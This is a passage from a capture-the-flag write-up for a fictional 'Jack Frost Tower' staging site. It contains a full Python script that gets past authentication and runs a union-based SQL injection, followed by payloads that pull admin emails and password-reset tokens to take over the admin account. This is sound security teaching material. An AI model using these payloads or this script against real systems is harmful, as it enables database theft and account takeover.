<span class="normal">72</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
<span class="kn">import</span> <span class="nn">click</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>


<span class="k">def</span> <span class="nf">authenticate</span><span class="p">(</span><span class="n">sess</span><span class="p">:</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
    <span class="sd">&quot;&quot;&quot;Submit the same contact form data twice to authenticate.&quot;&quot;&quot;</span>
    <span class="n">authenticated</span> <span class="o">=</span> <span class="kc">False</span>

    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
        <span class="c1"># Get the CSRF token</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://staging.jackfrosttower.com/contact&#39;</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&quot;html.parser&quot;</span><span class="p">)</span>
        <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;_csrf&#39;</span><span class="p">})[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>

        <span class="c1"># Submit the form</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://staging.jackfrosttower.com/postcontact&#39;</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">}</span>
        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;_csrf&#39;</span><span class="p">:</span> <span class="n">csrf_token</span><span class="p">,</span>
            <span class="s1">&#39;fullname&#39;</span><span class="p">:</span> <span class="s1">&#39;name&#39;</span><span class="p">,</span>
            <span class="s1">&#39;email&#39;</span><span class="p">:</span> <span class="s1">&#39;me@email.com&#39;</span><span class="p">,</span>
            <span class="s1">&#39;phone&#39;</span><span class="p">:</span> <span class="s1">&#39;1234567890&#39;</span><span class="p">,</span>
            <span class="s1">&#39;country&#39;</span><span class="p">:</span> <span class="s1">&#39;Belgium&#39;</span><span class="p">,</span>
            <span class="s1">&#39;submit&#39;</span><span class="p">:</span> <span class="s1">&#39;SAVE&#39;</span><span class="p">,</span>
        <span class="p">}</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&quot;html.parser&quot;</span><span class="p">)</span>

    <span class="k">if</span> <span class="s2">&quot;Email Already Exists&quot;</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;p&#39;</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;class&#39;</span><span class="p">:</span> <span class="s1">&#39;success&#39;</span><span class="p">}):</span>
        <span class="n">authenticated</span> <span class="o">=</span> <span class="kc">True</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Authentication successful&quot;</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">authenticated</span>


<span class="nd">@click</span><span class="o">.</span><span class="n">command</span><span class="p">()</span>
<span class="nd">@click</span><span class="o">.</span><span class="n">option</span><span class="p">(</span><span class="s1">&#39;-q&#39;</span><span class="p">,</span> <span class="s1">&#39;--query&#39;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;SQL select statement to run.&#39;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">cli</span><span class="p">(</span><span class="n">query</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;https://staging.jackfrosttower.com/detail&quot;</span>
    <span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">sqli</span> <span class="o">=</span> <span class="p">(</span>
        <span class="s2">&quot;0,0 union select * from ((select 1)F1 join (</span><span class="si">{}</span><span class="s2">)F2 join &quot;</span>
        <span class="s2">&quot;(select 3)F3 join (select 4)F4 join (select 5)F5 join &quot;</span>
        <span class="s2">&quot;(select 6)F6 join (select 7)F7);--&quot;</span>
    <span class="p">)</span>

    <span class="k">if</span> <span class="n">authenticate</span><span class="p">(</span><span class="n">sess</span><span class="p">):</span>
        <span class="c1"># Perform an SQL injection attack against the /detail endpoint</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">sqli</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">query</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
            <span class="k">if</span> <span class="s2">&quot;&lt;h1&gt;&quot;</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Results:&quot;</span><span class="p">)</span>
                <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">features</span><span class="o">=</span><span class="s2">&quot;html.parser&quot;</span><span class="p">)</span>
                <span class="n">results</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s2">&quot;h1&quot;</span><span class="p">)</span>

                <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">result</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">results</span><span class="p">):</span>
                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">idx</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s2">. </span><span class="si">{</span><span class="n">result</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] No results found.&quot;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] Something went wrong :/&quot;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] Authentication failure&quot;</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
<span class="n">cli</span><span class="p">()</span>
</code></pre></div>
</td></tr></table>
</details>
<p><img alt="Automate SQLi" src="../../img/objectives/o12/automate_sqli.png" /></p>
<div class="admonition done">
<p class="admonition-title">Answer</p>
<p>clerk</p>
</div>
<div class="admonition note">
<p class="admonition-title">Adding an administrator account</p>
<p>While not necessary for solving the challenge, we can also leverage the same SQL injection vulnerability to add a new administrator account. Start by using the below string to perform an SQLi attack against the <a href="https://staging.jackfrosttower.com/detail/0%2C0%20union%20select%20%2A%20from%20%28%28select%201%29F1%20join%20%28select%20email%20from%20users%20where%20user_status%3D1%29F2%20join%20%28select%203%29F3%20join%20%28select%204%29F4%20join%20%28select%205%29F5%20join%20%28select%206%29F6%20join%20%28select%207%29F7%29%3B--"><code>/detail</code></a> endpoint. This will retrieve all emails from the <em>users</em> table for full administrator accounts.</p>
<div class="highlight"><span class="filename">Get full admin emails</span><pre><span></span><code><span class="mi">0</span><span class="p">,</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> 
<span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">F1</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="n">email</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">user_status</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="n">F2</span> <span class="k">join</span> 
<span class="p">(</span><span class="k">select</span> <span class="mi">3</span><span class="p">)</span><span class="n">F3</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">4</span><span class="p">)</span><span class="n">F4</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">5</span><span class="p">)</span><span class="n">F5</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">6</span><span class="p">)</span><span class="n">F6</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">7</span><span class="p">)</span><span class="n">F7</span><span class="p">);</span><span class="c1">--</span>
</code></pre></div>
<p>Next, use one of the email addresses (e.g., <em>root@localhost</em>) to initiate a <a href="https://staging.jackfrosttower.com/forgotpass">password reset</a>. Once the reset request has been submitted, use the string below to perform another SQLi attack against the <a href="https://staging.jackfrosttower.com/detail/0%2C0%20union%20select%20%2A%20from%20%28%28select%201%29F1%20join%20%28select%20token%20from%20users%20where%20email%3D%27root%40localhost%27%29F2%20join%20%28select%203%29F3%20join%20%28select%204%29F4%20join%20%28select%205%29F5%20join%20%28select%206%29F6%20join%20%28select%207%29F7%29%3B--"><code>/detail</code></a> endpoint to retrieve the password reset <code>token</code> for the selected account.</p>
<div class="highlight"><span class="filename">Retrieve reset token</span><pre><span></span><code><span class="mi">0</span><span class="p">,</span><span class="mi">0</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> 
<span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">F1</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="n">token</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">email</span><span class="o">=</span><span class="s1">&#39;root@localhost&#39;</span><span class="p">)</span><span class="n">F2</span> <span class="k">join</span> 
<span class="p">(</span><span class="k">select</span> <span class="mi">3</span><span class="p">)</span><span class="n">F3</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">4</span><span class="p">)</span><span class="n">F4</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">5</span><span class="p">)</span><span class="n">F5</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">6</span><span class="p">)</span><span class="n">F6</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">7</span><span class="p">)</span><span class="n">F7</span><span class="p">);</span><span class="c1">--</span>
</code></pre></div>
<p>Making a request to <a href="https://staging.jackfrosttower.com/orgotpass/token/&lt;token&gt;"><code>/forgotpass/token/&lt;token&gt;</code></a> will allow us to set a new password for the <em>root@localhost</em> account and log in. Our full administrator status now also allows us to delete contact entries, access the user list, and create additional administrator accounts for ourselves and all our friends.</p>
<p><img alt="/userlist" class="border" src="../../img/objectives/o12/userlist.png" /></p>
</div>
                
              
              
                


              
            </article>
          </div>
        </div>
        
      </main>
      
        
<footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="Footer">
      
        
        <a href="../o11/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Customer Complaint Analysis" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              Customer Complaint Analysis
            </div>
          </div>
        </a>
      
      
        
        <a href="../o13/" class="md-footer__link md-footer__link--next" aria-label="Next: FPGA Programming" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              FPGA Programming
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; 2021 <a href="https://n00.be">Thomas Bouve</a>
          </div>
        
        
          Made with
          <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
            Material for MkDocs
          </a>
        
        
      </div>
      
  <div class="md-footer-social">
    
      
      
      <a href="https://twitter.com/crahan" target="_blank" rel="noopener" title="CraHan on Twitter" class="md-footer-social__link">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
      </a>
    
      
      
      <a href="https://github.com/crahan" target="_blank" rel="noopener" title="CraHan on GitHub" class="md-footer-social__link">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
      </a>
    
      
      
      <a href="https://www.instagram.com/crahan/" target="_blank" rel="noopener" title="CraHan on Instagram" class="md-footer-social__link">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg>
      </a>
    
  </div>

    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "../..", "features": ["toc.integrate"], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.fcfe8b6d.min.js", "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.b1047164.min.js"></script>
      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/tablesort/5.2.1/tablesort.min.js"></script>
      
        <script src="../../js/tablesort.js"></script>
      
    
  </body>
</html>